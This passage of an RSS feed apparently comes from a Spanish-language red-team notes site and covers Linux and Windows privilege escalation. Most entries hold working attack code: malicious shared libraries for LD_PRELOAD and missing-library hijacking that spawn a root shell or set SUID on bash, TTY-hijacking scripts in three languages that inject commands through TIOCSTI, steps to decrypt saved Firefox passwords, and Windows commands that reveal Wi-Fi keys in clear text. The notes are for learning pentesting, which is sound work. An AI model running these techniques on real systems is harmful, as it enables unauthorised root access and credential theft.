Copy<br>Una vez que tengamos las funciones que se usan, por ejemplo del script: <br>#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
#include &lt;stdlib.h&gt;

int main(int argc, char const *argv[]){
    srand(time(NULL));
    printf("%d\n", rand());
    return 0; 
}
Copy<br>uftrace --force -a {binary}
# 1838698392
# DURATION     TID     FUNCTION
#   5.840 us [110824] | time();
#   1.308 us [110824] | srand();
#   0.433 us [110824] | rand();
# 206.138 us [110824] | printf("%d\n") = 11;
Copy<br>Vemos que se nos listan las funciones utilizadas en el script, por lo que ahora intentando realizar un secuestro de la biblioteca de objetos compartidos enlazados dinámicamente podríamos replicar la función "rand" que se usa en el script para realizar un código que nos interese. <br>Por lo que para poder realizar esta "suplantación" de función, las firmas deben coincidir (Las firmas son el conjunto de lo que la función retorna, como se llama y los argumentos que recibe)<br>Es decir, a la hora de ejecutar el binario, por detrás el enlazador dinámico  por detrás carga las bibliotecas compartidas necesarias para que este programa funcione correctamente, ahora, este enlazador dinámico lo que hace es tomar como prioritario una variable de entorno llamada LD_PRELOAD, por lo que si esta variable lo igualamos a un binario de una biblioteca compartida que hayamos creado previamente, podríamos manipular el código para que se ejecute las instrucciones que quisiéramos.<br>int rand(void){
	return 777; 
}
Copy<br>Una vez creado el código malicioso (En este ejemplo alteramos el binario original para que en lugar de retornar un número random retorne siempre 777) simplemente falta compilarlo como biblioteca compartida con el comando gcc -shared -fPIC {file.c} -o {binary_name} y exportar la variable de entorno. <br>gcc -shared -fPIC malicious.c -o randomname 

LD_PRELOAD=randomname ./{binary}
Copy<br><br>Otro ejemplo un poco más complejo es el siguiente. <br>Tenemos un binario en la ruta /usr/bin/welcome el cual no se puede ejecutar por un error y es SUID. El error que nos tira es "libwelcome.so: cannot open shared object file: No such file or directory". <br>En este caso si jugamos con ldd /usr/bin/welcome nos devuelve libwelcome.so =&gt; not found y en este caso si intentamos explotar este secuestro de la biblioteca con con la variable LD_PRELOAD no va a funcionar.<br>En estas ocasiones tenemos otras vías, la primera, es ver si tenemos permisos de escritura en la ruta /etc/ld.so.conf.d para crear una archivo de configuración para indicar a que ruta tiene que ir el binario para encontrar la biblioteca en cuestión. También podemos ver a que rutas se dirige a la hora de buscar dicho recurso en las configuraciones. <br>En el ejemplo dado, el binario nos arroja error dado que no encuentra la ruta, por lo que vemos que dentro de la ruta /etc/ld.so.conf.d existe un archivo de configuración llamado custom.conf el cual contiene una ruta inexistente como "/home/dobliuw/lib", pero en el home del user dobliuw no existe la carpeta lib, por lo que podríamos crear la carpeta y así mismo el script en c malicioso para convertirlo en una biblioteca compartida. <br>cd /home/dobliuw 

mkdir lib 

cd !$ 

nano malicious.c 
Copy<br><br>#inlcude &lt;stdio.h&gt; 
#include &lt;unistd.h&gt;

int welcome(){
	setuid(0);
	setgid(0);
	system("bash -p");
	return 0;
}
Copy<br><br>Ahora solo quedaría convertir dicho script en un binario de biblioteca compartida con gcc -shared -fPIC malicious.c libwelcome.so. <br>Por lo que ahora al ejecutar el binario inicial (/usr/bin/welcome) al contener permisos SUID y habiendo secuestrado la biblioteca de objetos compartidos enlazados dinámicamente con un script el cual setea el uid en 0 para asegurarnos ser root nos lanzaría una consola privilegiada como root. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/secuestro-de-la-biblioteca-de-objetos-compartidos-enlazados-dinámicamente.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:04 GMT</pubDate></item><item><title><![CDATA[Sesiones de Firefox]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> 
<br><br><br>Una sesión de Firefox se refiere a la colección de ventanas, pestañas, historial de navegación, contraseñas guardadas y preferencias qeu están activadas durante una sesión específica de uso del navegador web Mozilla Firefox. En otras palabras, cuando abrimos Firefox y comenzamos a navegar por internet, todos los selementos que se están utilizando y personalizando en ese momento constituyen la sesión de Firefox.<br>Esto puede incluir ventanas, pestañas, historial de navegación, contraseñas guardadas, preferencias, tokens de inicio de sesión, etc.<br><br><br>Cuando tenemos sesiones de firefox, por ejemplo que tenemos un directorio Mozilla el cual contiene un directorio firefox que posee una sesión, por ejemplo g2mhbq0o.default podríamos intentar ver valores almacenados pudiendo en el mejor de los casos hacernos de una contraseña, tokens, etc. <br>Solo haría falta hacer uso de una herramienta llamada <a data-tooltip-position="top" aria-label="https://github.com/lclevy/firepwd" rel="noopener nofollow" class="external-link" href="https://github.com/lclevy/firepwd" target="_blank">firepwd</a> la cual nos pedira el archivo key4.db o key3.db así tambien como el logins.json. <br>U otras utilidades a usar pueden ser <a data-tooltip-position="top" aria-label="https://github.com/unode/firefox_decrypt" rel="noopener nofollow" class="external-link" href="https://github.com/unode/firefox_decrypt" target="_blank">firefox_decrypt</a> las cuales pueden hacer uso de las sesiones completas, por los que nos convendría intentear compartir todos los archivos de una sesión incluyendo prfiles.ini y las carpetas de sesiones como bzo7sjt1.default. (wget -r {target_ip}:{port})]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/sesiones-de-firefox.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Sesiones de firefox.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:04 GMT</pubDate></item><item><title><![CDATA[Shared Objects]]></title><description><![CDATA[ 
 <br><br>En sistemas Unix y similares (Como Linux), los Shared Objects (SO) u Objetos Compartidos son archivos que contiene código ejecutable que puede ser compartido entre múltiples programas al mismo tiemp. Se utilizan principalmente para implementar bibliotecas dinámicas, que permiten que varias aplicaciones compartan el mismo código sin necesidad de incluirlo cada una en su propio ejecutable.<br>Estos objetos se cargan en tiempo de ejecución por el linker dinámico (Como ld.so en Linux), similar a las Dynamic Link Libraries de Windows (DLLs), esto nos da lugar a algunos ataques o abusos (<a data-href="Abusing Dynamic Modules" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abusing-dynamic-modules.html" class="internal-link" target="_self" rel="noopener nofollow">Abusing Dynamic Modules</a>), pero en este caso con Shared Objects. Esto permite que el código sea compartido entre múltiples procesos que lo necesitan.<br><br><br>La inyección de Shared Objects en sistemas Unix/Linux, así como la inyección de módulos dinámicos en Windows (Ejemplo DLL Injection, DLL Hijacking (<a data-href="Abusing Dynamic Modules" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abusing-dynamic-modules.html" class="internal-link" target="_self" rel="noopener nofollow">Abusing Dynamic Modules</a>)), tienen como objetivo la ejecución de código arbitrario en el contexto de un proceso privilegiado, lo que puede resultar en una Privilege Scalation. <br>Mediante la inyección o el secuestro de estos módulos, un atacante puede introducir código malicioso que el sistema ejecutará con los privilegios del proceso comprometido.<br>Por ejemplo, supongamos que tenemos un binario (/usr/bin/dobliuw) el cual podemos ejecutar con privilegios adminsitrativos, algo que podríamos realizar es una simple visualización de procesos a bajo nivel que se ejecutan por detrás en este binario con el comando strace (Herramienta de depuración que se utiliza para interceptar y registrar las system calls y las señales que son realizadas por un proceso durante ejecución).<br>strace /usr/bin/dobliuw
Copy<br>Tras la ejecución de este comando, pondremos a correr el binario mencionado y funcionará como siempre, con la diferencia de que tendremos todas las llamadas al sistema y señales realizadas por detrás, por lo que podríamos visualizar algo como lo siguiente:<br><img alt="so_injection_example.png" src="https://dobliuw.com/lib/media/so_injection_example.png"><br>En este caso, nos interesa aquellas alertas de No such file or directory, donde podemos ver los Shared Objects que intenta cargar el programa y no logra hacerlo por que no encuentra los mismos.<br>En este punto, podemos empezar a pensar en una Shared Objects Injection o Shared Objects Hijacking. Todo dependerá de los permisos de escriturá que podamos llegar a tener en dichos directorios donde se intentan cargar dichas "librerias". <br>En caso de disponer de permisos de escritura, podríamos seguir <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/papers/37606" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/papers/37606" target="_blank">árticulos</a> que encontremos en internet que expliquen como lograr crear e inyectar estos objetos compartidos:<br>nano /home/.config/so_injection.c
Copy<br>
<br>Contenido del archivo so_injection.c:
<br>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

static void so_i() __attribute__((constructor));

void so_i() {
    system("chmod +s /bin/bash &amp;&amp; echo 'SO Injection succesfully done :) &gt; /tmp/privesc.log'");
}
Copy<br>Una vez creado el archivo C, deberemos utilizar este para, haciendo uso de compiladores como gcc, crear el Shared Object basado en este código que ejecutará a nivel de sistema la instrucción ingresada en tiempo de carga.<br>gcc -shared -o libcounter.so -fPIC so_injection.c
Copy<br>Una vez ejecutado este comando, habremos creado el Shared Object libcounter.so que visualizamos previamente con strace que se intentaba cargar de una ruta del sistema pero no existia, tras esta sucesión de comandos habremos creado una "Malicious Shared Object". Simplemente quedaría volver a ejecutar el binario inicial (Ejemplo dado /usr/bin/dobliuw) y cuando se intente cargar este objeto compartido, se logrará cargar y se ejecutará en tiempo de carga lo que previamente indicamos en el archivo .c, asignando así, por ejemplo, permisos SUID a la bash.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/shared-object-injection-(-.so-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/Shared Object Injection - ( .so ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 21 Aug 2024 22:02:14 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/so_injection_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/so_injection_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[TTY Hijacking]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:escalada" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#escalada</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:escalada" class="tag" target="_blank" rel="noopener nofollow">#escalada</a> 
<br><br><br>Una TTY es un dispositivo de caracteres que realiza la entrada y la salida de carácter en carácter. La comunicación entre los dispositivos de termina y los programas que los leen y escriben está controlada por la interfaz tty.<br><br><br>Cuando un usuario ejecuta su $USER o su -u $USER (A menos que se establezca la opción use_pty) ese mismo $USER puede aprovecharse de esta terminal del otro usuario con privilegios haciendo uso de la función TIOCSTI ictl para inyectar comandos en esta terminal privilegiada y por lo tanto con los permisos correspondientes. <br><br><br>Para explotar esta vulnerabilidad, primero debemos identificar al usuario privilegiado ejecutando el comando su -u, esto podríamos hacerlo hacinedo uso de herramientas como pspy o scripts propios para reconocer comandos ejecutados a nivel de sistema.<br>Teniendo en cuenta el comando w, el cual nos permite verificar que usuarios estan logueados y que estan realizando, podríamos detectar a un usuario privilegiado. (watch -n 1 w)<br>Una vez detectado esto, solo haría falta ejecutar un script en c, perl o python para abusar de esta vulnerabilidad. Recomendado leer el <a data-tooltip-position="top" aria-label="https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking" rel="noopener nofollow" class="external-link" href="https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking" target="_blank">post</a> donde se habla de esta vulnerabilidad.<br><br>#!/usr/bin/python3
import os
import fcntl
import termios

def main():
    fd = os.open("/dev/tty", os.O_RDWR)
    if fd &lt; 0:
        print("open")
        return -1

    x = "exit\necho Payload as `whoami`\n"
    for c in x:
        ret = fcntl.ioctl(fd, termios.TIOCSTI, c.encode())
        if ret == -1:
            print("ioctl()")
    
    os.close(fd)
    return 0

if __name__ == "__main__":
    main()
Copy<br><br>#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/ioctl.h&gt;

int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd &lt; 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\necho Payload as `whoami`\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
Copy<br><br>#!/usr/bin/perl

require "sys/ioctl.ph";
open my $tty_fh, '&lt;', '/dev/tty' or die $!;
foreach my $c (split //, "exit\n".'echo Payload as $(whoami)'.$/) {
    ioctl($tty_fh, &amp;TIOCSTI, $c);
}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/linux/tty-hijacking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Linux/TTY Hijacking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:05 GMT</pubDate></item><item><title><![CDATA[Privilege Scalation]]></title><description><![CDATA[ 
 <br><br>Como en todo proceso de Hacking a un determinado host, no importa cual sea su Sistema Operativo, la meta siempre será hacernos como dueños del mismo, de esta manera podremos tener el absoluto control y poder en el mismo. Pero esto no siempre es alcanzado tras la explotación, a lo mejor ingresamos al sistema por medio de una explotación web de un servicio IIS, en el caso de Windows, o Apache o Nginx, en el caso de OS basados en Linux, y no necesariamente vamos a ser usuarios Administradores o root, en cambio, vamos a haber obtenido acceso al sistema como el usuario que ejecuta la acción, es decir que muy probablemente seamos un usuario con bajos permisos o mismo una cuenta de servicio, al final.... pudimos haber obtenido acceso al sistema explotando una vulnerabilidad que nos permite obtener <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a> y cuando ejecutemos los comandos, estos serán ejecutados por el usuario que corra el servicio.<br>La meta de la fase de Privilege Escalation es escalar los permisos o privilegios que tiene el usuario vulnerado, esto puede implicar convertirnos en el usuario Administrator,  pero también puede implicar convertirnos en otros usuarios del sistema que tengan mayor privilegios al usuario vulnerado en principio, si bien la meta es ser dueños del sistema, no necesariamente puede haber una vía directa del usuario vulnerado en principio al usuario con máximos privilegios, puede ser una suseción de escaladas de privilegios hasta lograr nuestro goal. <br><br><br><br>Una vez en el sistema, llevar a cabo una enumeración del mismo es un proceso clave antes de tomar desiciones de realizar tareas más tediosas o de análisis profundo para búscar posibles vias de aumentar nuestro privilegio. Algunos de los comandos más básicos utilizados que nos pueden ayudar a detectar usuarios del sistema, arquitectura, version, nombre, redes, etc. del mismo son:<br># Print information about the config and properties of Local Machine
&gt; systeminfo
# We could filter the stdout with findstr command
&gt; systeminfo | findstr /B /IC:"os name" /IC:"os version" /IC:"system type"
&gt; wmic os get Caption, OSArchitecture, Version
# Hostname 
&gt; hostname
# Use Windows Management Instrumentation for last patches
&gt; wmic qfe
&gt; wmic qfe get Caption, Description, HotFixID, InstalledOn
# 
&gt; wmic logicaldisk get caption,description,providername
Copy<br><br>Algo totalmente fundamental tras comprometer un sistema, es entender quiénes son los usuarios presentes para comprender el alcance de las cuentas y posibles puntos de entrada. La enumeración de usuarios implica identificar cuentas activas, privilegios asociados y posibles vulnerabilidades relacionadas con la gestión de usuarios. Herramientas como net user o whoami pueden proporcionar detalles sobre los usuarios locales y sus atributos. <br># Verify who user we are
&gt; whoami
# List privileges
&gt; whoami /priv
# List groups information
&gt; whoami /groups
# Get all users on the machine
&gt; net user 
# Get information about specific user
&gt; net user {username}
# Try to get local groups information
&gt; net localgroup 
# Get members about a group
&gt; net localgroup {group_name}
Copy<br><br>La infraestructura de red ofrece un panorama más amplio y potencialmente revelador del entorno en el que se encuentra el sistema comprometido. La enumeración de red implica identificar hosts activos, servicios expuestos, topología de red y relaciones entre dispostivios. herramientas como ipconfig, netstat y nmap so ncomunes para revelar direcciones IP, puertos abiertos y  conexiones activas, proporcionando información valiosa para mapear la superficie de ataque y encontras posibles vectores de escalada de privilegios.<br># See information about arquitecture of the network
&gt; ipconfig
&gt; ipconfig /all
# Look arp tables
&gt; arp -a 
# Print the routing table
&gt; route print
# Print open ports in the system
&gt; netstat -ano
Copy<br><br>Las contraseñas débiles o mal gestionadas puede representar una vulnerabilidad significativa en cualquier sistema. La búsqueda de contraseñas implica la identificación y explotación de debilidades en las políticas de seguridad de contraseñas, archivos de configuración, almacenamiento de contraseñas y prácticas de usuario. Herramientas como pwdump o mimikatz pueden extraer contraseñas almacenadas en el sistema, mientras que técnicas como el atque de diccionario o la fuerza bruta se tuiliza para descirfrar contraseñas débiles. La búsqueda de contraseñas es fundamental para aprovechar credenciales comprometidas y avanzar en los viles de privilegio dentro del sistema comprometido.<br># Find recursive and insensitive mode the word "password" in txt, conf and xml file in owenp user desktop
&gt; findstr /si 'password' *.txt *.conf *.xml C:\Users\owenp\Desktop
# Find an SSID
&gt; netsh wlan show profile
# Try to get Wi-Fi clear text password 
&gt; netsh wlan show profile "{ssid}" key=clear
Copy<br><br>La presencia de firewalls en un sistema puede influir significativamente en la efectividad de los ataques y la escalada de privilegios .La enumeración de firewalls implica idetnficar las reglas de filtrado de paquetes, puertos bloqueados y políticas de seguridad aplicadas a nivel de red, herramientas como netsh advfirewall o, aunque deprecada, netsh firewall pueden revelar la configuración del firewall.<br>
Por otro lado, la presencia de software de antivirus puede representar otro obstáculo significativo para nosotros los pentesters o los ciberdelincuentes. La enumeración de antivirus implica idetnficar la presencia de software de seguridad, versiones, firmas de virus y configuraciones de detección. Herramientas como wmic product get en Windows pueden revelar la existencia de estos. Además , la exploración proactiva de políticas de escaneo, exclusiones de archvios y comportamientos del software antivirus puede proporcionar información curcial sobre cómo evadir la detección y persistir en el sistema comprometido.<br># List information about Windows Defender
&gt; sc query windefend
# Find all services running (For another AVs)
&gt; sc queryex type= service
# Try to dump firewall configurations
&gt; netsh advfirewall firewall dump
# Older command to list firewall status
&gt; netsh firewall show state 
# Show firewall configuration
&gt; netsh firewall show config
Copy<br>Recurso: <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" rel="noopener nofollow" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank">PayloadAllTheThings</a><br>
Recurso: <a data-tooltip-position="top" aria-label="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" rel="noopener nofollow" class="external-link" href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" target="_blank">TotalOSCPGuide</a><br>
Recurso: <a data-tooltip-position="top" aria-label="" rel="noopener nofollow" class="external-link" href="https://dobliuw.com" target="_blank">Windows Privesc Checklist</a><br><br><br><br>
<br><a data-tooltip-position="top" aria-label="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" rel="noopener nofollow" class="external-link" href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank">winPEAS.exe</a>
<br><a data-tooltip-position="top" aria-label="https://github.com/GhostPack/Seatbelt" rel="noopener nofollow" class="external-link" href="https://github.com/GhostPack/Seatbelt" target="_blank">Seatbelt.exe (Compile)</a>
<br><a data-tooltip-position="top" aria-label="https://github.com/rasta-mouse/Watson" rel="noopener nofollow" class="external-link" href="https://github.com/rasta-mouse/Watson" target="_blank">Watson.exe (Compile)</a>
<br><a data-tooltip-position="top" aria-label="https://github.com/GhostPack/SharpUp" rel="noopener nofollow" class="external-link" href="https://github.com/GhostPack/SharpUp" target="_blank">SharpUp.exe (Compile)</a>
<br><br>
<br><a data-tooltip-position="top" aria-label="https://github.com/rasta-mouse/Sherlock" rel="noopener nofollow" class="external-link" href="https://github.com/rasta-mouse/Sherlock" target="_blank">Sharlock.ps1</a>
<br><a data-tooltip-position="top" aria-label="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" rel="noopener nofollow" class="external-link" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank">PowerUp.ps1</a>
<br><a data-tooltip-position="top" aria-label="https://github.com/411Hall/JAWS" rel="noopener nofollow" class="external-link" href="https://github.com/411Hall/JAWS" target="_blank">jaws-enum.ps1</a>
<br><br>
<br><a data-tooltip-position="top" aria-label="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" rel="noopener nofollow" class="external-link" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">windows-exploit-suggester.py (local)</a>
<br><a data-tooltip-position="top" aria-label="https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/" rel="noopener nofollow" class="external-link" href="https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/" target="_blank">Exploit Suggester (Metasploit)</a>
<br>Tanto los ejecutables como los scripts en powershell son herramientas que nos automatizan una gran parte de la detección de posibles vulnerabilidades, estos ejecutables y scripts se corren en la máquina víctima y obtendremos un output el cual podremos analizar con mayor cuidado. Pero también existen otras alternativas, como por ejemplo el uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" rel="noopener nofollow" class="external-link" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">Windows Exploit Suggester</a> el cual es un script en Python que corremos de manera local que hace uso de una base de datos de vulnerabilidades y lee un archivo .txt el cual debería tener el contenido del output del comando systeminfo. <br>Por lo que en la máquina víctima ejecutamos el comando systeminfo, capturamos el output y lo guardamos en un archivo en nuestra máquina de atacante local y posteriormente instalamos las dependencias necesarias, ejectuamos los comandos adjuntados en la guía de uso de Windows Exploit Suggester y obtendríamos posibles vulnerabilidades a revisar y explotar.<br># Clone the Windows Exploit Suggester tool
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester -l windowsSuggester
# Install or Upgrade if is possible the dependencie xlrd
pip3 install xlrd --upgrade
# Update the database .xlsx file 
python2 windowsSuggester/windows-exploit-suggester.py --update
# Try to found vulnerabilities
python2 windowsSuggester/windows-exploit-suggester.py --database {database.xlsx} --systeminfo {path/to/file.txt/with/systeminfo/output}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/0.-enumerating-possible-privesc.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/3. Privilege Scalation/Windows/0. Enumerating possible privesc.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 31 May 2024 14:28:47 GMT</pubDate></item><item><title><![CDATA[1. Windows Privilege Escalation CHECKLIST]]></title><description><![CDATA[ 
 <br>ACLARACIÓN: Esto es una copia adaptada a un uso personal y funcional del recurso original <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" target="_blank">Checklist Widnows Privilege Scalation</a> de HackTricks.<br><br>
<br>Obtain <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#system-info" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#system-info" target="_blank"><strong></strong></a>System information
<br>Search for kernel <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#version-exploits" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#version-exploits" target="_blank"><strong></strong></a>exploits using scripts 
<br>Use Google to search for kernel exploits 
<br>Use searchsploit to search for kernel exploits
<br>Interesting info in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#environment" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#environment" target="_blank"><strong></strong></a>env vars?
<br>Passwords in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#powershell-history" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#powershell-history" target="_blank"><strong></strong></a>PowerShell history?
<br>Interesting info in <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#internet-settings" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#internet-settings" target="_blank"><strong></strong></a>Internet settings?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#drives" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#drives" target="_blank"><strong></strong></a>Drives?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus" target="_blank"><strong></strong></a>WSUS exploit?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" target="_blank"><strong></strong></a>AlwaysInstallElevated?
<br><br>
<br>Check <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#audit-settings" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#audit-settings" target="_blank"><strong></strong></a>Audit and <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wef" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wef" target="_blank"><strong></strong></a>WEF settings 
<br>Check <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#laps" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#laps" target="_blank"><strong></strong></a>LAPS
<br>Check if <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wdigest" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wdigest" target="_blank"><strong></strong></a>WDigest is active
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#lsa-protection" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#lsa-protection" target="_blank"><strong></strong></a>LSA Protection?
<br><a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-guard" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-guard" target="_blank"><strong></strong></a>Credentials Guard<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-credentials" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#cached-credentials" target="_blank">?</a>
